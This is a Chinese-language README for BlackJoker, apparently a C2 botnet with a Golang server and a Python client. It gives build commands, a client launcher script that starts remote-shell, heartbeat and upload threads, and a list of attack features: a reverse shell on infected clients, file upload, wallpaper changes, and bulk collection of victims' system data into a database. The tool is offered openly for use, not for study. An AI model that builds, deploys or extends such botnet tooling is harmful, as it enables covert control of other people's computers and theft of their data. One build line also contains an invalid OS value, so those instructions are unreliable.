# BlackJokerV0.3

**BlackJoker是一个由Golang来开发服务端使用Python来开发客户端的C2BotNet**

构架:
> BlackJoker采用C&S构架,使用HTTP反向代理通信,**目前没有开发流量加密中间件**,它拥有类似Msf的内部Shell


环境要求:

1.打开目录下的config.json文件,配置你的相关参数

2.Mysql数据库,并先行创建你在config.json中设置的表名

3.需要自定义编译客户端需要Pyinstaller or Cython工具

```
pyinstaller -F -add-data "R-Cadimn.jpg" main.py
```
开发者推荐的客户端编译代码:

```
python BlackJoker/Client/ClientPyd/Cython编译目录/setup.py build_ext --inplace

```
BlackJoker/Client/ClientPyd/Cython编译目录/blackjoker.py:
```
import BlackJokerpyx # type: ignore
import threading

if __name__ == "__main__":
    if BlackJokerpyx.init_server():
        # 启动线程
        threads = [
            threading.Thread(target=BlackJokerpyx.shell_os_http),
            threading.Thread(target=BlackJokerpyx.heartbeat_http),
            threading.Thread(target=BlackJokerpyx.heartbeat_receive_and_upload)
        ]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()

```

```
pyinstaller -F blackjoker.py -add-data "{python BlackJoker/Client/ClientPyd/Cython编译目录/setup.py build_ext --inplace得到的pyd文件路径}"
```

4.需要自定义编译服务端需要Golang环境

```
cd BlackJoker

go build -o Black.exe

```
Linux系统:

```
go env -w GOOS=linux GOARCH=amd64

go build -o Black.exe
```

Mac系统:

```
go env -w GOOS=darwin3 GOARCH=amd64

go build -o Black.exe
```

你也可以从我们的发行版获取BlackJoker.exe

## BlackJoker Attack Mod:

1.反弹客户端Shell

2.上传文件到客户端

3.更换客户端壁纸

4.自动获取客户端系统大量数据信息保存在数据库中

## 本次更新内容:
 见发行版

## 使用说明:
你可以在BlackJoker的运行过程中得到一切使用指引

注意 项目仍在努力更新中
